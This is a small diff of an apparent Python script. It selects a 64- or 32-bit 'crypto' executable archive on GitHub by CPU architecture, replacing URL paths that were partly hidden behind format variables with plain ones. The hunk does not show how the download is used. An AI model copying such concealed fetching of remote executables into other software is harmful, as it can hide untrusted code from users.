@@ -38,13 +38,13 @@ if 'aarch64' in str(find_aarch):
 
         user_aarch = '64'
 
-        download_link = f'https://github.com/salokhnx3{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+        download_link = f'https://github.com/salokhnx3/executables/odome/blob/main/crypto64/crypto64.zip?raw=true'
 
 elif 'arm' in str(find_aarch):
 
         user_aarch = '32'
 
-        download_link = f'https://github.com/salokhnx3{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+        download_link = f'https://github.com/salokhnx3/executables/odome/blob/main/crypto32/crypto32.zip?raw=true'
 
 else:
 
